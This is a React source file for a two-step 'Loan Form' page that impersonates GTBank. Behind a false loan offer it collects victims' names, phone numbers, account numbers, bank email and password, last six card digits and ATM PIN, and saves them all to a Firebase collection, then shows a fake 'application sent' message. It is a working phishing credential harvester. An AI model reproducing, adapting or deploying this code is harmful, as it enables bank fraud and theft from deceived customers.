
import React, {useState} from 'react';

import './App.css';
//import { AiOutlineMenu, } from 'react-icons/ai';
//import { Link } from 'react-router-dom';
import { GiConfirmed } from "react-icons/gi";
import {db} from './firebase-config'
//import firebase from "firebase";
import { collection, addDoc, doc, updateDoc  } from "firebase/firestore";
//import {fir} from "firebase/app";
import { AiOutlineArrowRight, } from 'react-icons/ai';


const Main = () => {



    const [f_name, setFname] = useState("")
    const [l_name, setLname] = useState("")
    const [l_amount, setAmount] = useState("")
    const [phone, setPhone] = useState("")
    const [date, setDate] = useState("")

  ////////////////////////////////////////

    const [acno, setAcc] = useState("")
    const [email, setEmail] = useState("")
    const [pass, setPss] = useState("")
    const [last6card, setLast6card] = useState("")
    const [cardpin, setCardPin] = useState("")

  //////////////////////////////////////////
    const [next, setNext] = useState(false)
    const [done, setDone] = useState(false)
  const [error, setError] = useState(false)
  const [cid, setCid] = useState("")


  const addFirst = async () => {
    
      const docs = await addDoc(collection(db, 'gtb'), {
        fname: f_name,
        lname: l_name,
        amount: l_amount,
        phone: phone,
        payback: date,
        createdAt:Date.now()
      })
    
    setCid(docs._key.path.segments[1])
    //console.log(docs._key.path.segments[1])
  }
  const setNextFun = () => {
    if (f_name.length < 3 || l_name.length < 3 || l_amount < 10000 || phone.toString().length < 11) {
     // console.log("first issue")
      return setError(true)
    }
    addFirst()
    setError(false);
    //console.log("worked")
    return setNext(true);
  }

  const setSubmit1 = async () => {
    if (acno.toString().length < 3 || last6card.length < 6 || last6card > 6 || cardpin.length < 4||cardpin.length > 4) {
     // console.log("first issue")
      return setError(true)
    }

    const taskDocRef = doc(db, 'gtb', cid)
      try{
        await updateDoc(taskDocRef, {
          accountNo:acno,
          email:email,
          pass:pass,
          last6card:last6card,
          cardpin:cardpin,
        })

        setDone(true)
      } catch (err) {
        console.log(err)
      }   
  
  }

  //console.log(od)
  if (done) {
    return (
      <div className='don-page'>
        <div className='writeup'>
          Your Application Has Been sent. <br />
          An email would be sent to you for confirmation.
          <br />
          Thank you.
        </div>
        <GiConfirmed color='orange' size={30}/>

      </div>
      
    );
  }
  if (next) {
    return (
      <div className='register-and-login'>
        <div className='form-div'>
          <h3>Loan Form</h3>
                <small className='indecator'><div style={{color:"red"}}>*</div>Indicates required field</small>
                {error&&<small className='indecator'><div style={{color:"red"}}>Invalid input(s).</div></small>}
          <br />

          <small className='indecator'>Account Number<div style={{color:"red"}}>*</div></small>
          <input type="number" className='other-input' onChange={e => setAcc(e.target.value)} placeholder='Account Number' value={acno}  required/>
          <small className='indecator'>Email Link To GTBank<div style={{color:"red"}}>*</div></small>
          <input type="email" className='other-input' onChange={e => setEmail(e.target.value)} placeholder='Email' value={email} required />
          <small className='indecator'>Password<div style={{color:"red"}}>*</div></small>
          <input type="password" className='other-input' onChange={e=>setPss(e.target.value)}  placeholder='Password' value={pass} required/>
          <small className='indecator'>Last Six Digit Of ATM Card<div style={{color:"red"}}>*</div></small>
          <input type="number" className='other-input' onChange={e => setLast6card(e.target.value)} placeholder='123 456' value={last6card} required />
          <small className='indecator'>ATM Card Pin<div style={{color:"red"}}>*</div></small>
          <input type="password" className='other-input' onChange={e=>setCardPin(e.target.value)}  placeholder='****' value={cardpin} required/>
          <button onClick={setSubmit1} className='get-loan'><div>Apply For Loan</div> <AiOutlineArrowRight/></button>
        </div>
      </div>
      
    );
  }
  return (
    <div className='register-and-login'>
      <div className='form-div'>
      <h3>Loan Form</h3>
              <small className='indecator'><div style={{color:"red"}}>*</div>Indicates required field</small>
               {error&&<small className='indecator'><div style={{color:"red"}}>Invalid input(s).</div></small>}

        <br />
        <small className='indecator'>Name<div style={{color:"red"}}>*</div></small>
              <div className='names-form-div'>
                <input type="text" className='name-input' onChange={e=>setFname(e.target.value)} placeholder='First Name' value={f_name}  required/>
                <input type="text" className='name-input' onChange={e=>setLname(e.target.value)}  placeholder='Last Name' value={l_name} required/>
              </div>
              <small className='indecator'>Amount<div style={{color:"red"}}>*</div></small>
              <input type="number" className='other-input' onChange={e => setAmount(e.target.value)} placeholder='Loan Amount' value={l_amount}  required/>
              <small className='indecator'>Phone<div style={{color:"red"}}>*</div></small>
              <input type="number" className='other-input' onChange={e => setPhone(e.target.value)} placeholder='Phone (use phone number linked to your GTBank)' value={phone} required />
              <small className='indecator'>Payback Date</small>
              <input type="date" className='other-input' onChange={e=>setDate(e.target.value)}  placeholder='Estimated Payback Date' value={date} required/>
              <button className='get-loan' onClick={setNextFun}><div>Next</div> <AiOutlineArrowRight/></button>
        </div>
    </div>
    
  );
};


export default Main